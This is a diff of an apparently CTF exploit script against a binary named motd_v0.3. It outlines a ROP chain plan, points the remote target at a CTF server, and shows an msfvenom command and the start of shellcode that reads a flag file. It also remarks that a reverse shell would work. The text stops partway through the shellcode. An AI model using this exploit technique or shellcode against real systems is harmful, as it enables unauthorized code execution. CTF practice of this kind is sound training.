@@ -32,22 +32,26 @@ Explanation:
     several registers.  Remember that the calling convention in X64 is
     arguments 1-6 in RDI, RSI, RDX, RCX, R8, R9.
 
+        => we need gadgets to set RDI, RSI, and RDX.
+
     We also need `stdin` to pass to `fgets`. Unfortunately, it will not be in
     the GOT until after process load, and because of ASLR it can't be
     hardcoded.  Hunting for gadgets that could let us dereference the GOT
     address is another part of this challenge.
+
+        => we need a dereference gadget: something like `mov rax, [rsp + 4]`
 
     So we identify gadgets using ROPGadget.py that will let us pop into those registers.
     the full chain is commented inline with the code below.
 """
 
 REMOTE = False
-REMOTE = ('127.0.0.1', 3003)
+REMOTE = ('ctf.segfault.me', 3003)
 TARGET = '../bin/motd_v0.3' # Binary path (local)
 DEBUG  = False              # Follow along in GDB
 
 # msfvenom -p linux/x64/exec CMD='cat ~/flag.txt' -f c -b "\x0a\x0d"
-# A reverse shell would work too here.
+# A reverse shell should work too.
 SHELLCODE = (
 "\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53"
 "\x48\x89\xe7\x68\x2d\x63\x00\x00\x48\x89\xe6\x52\xe8\x0f\x00"
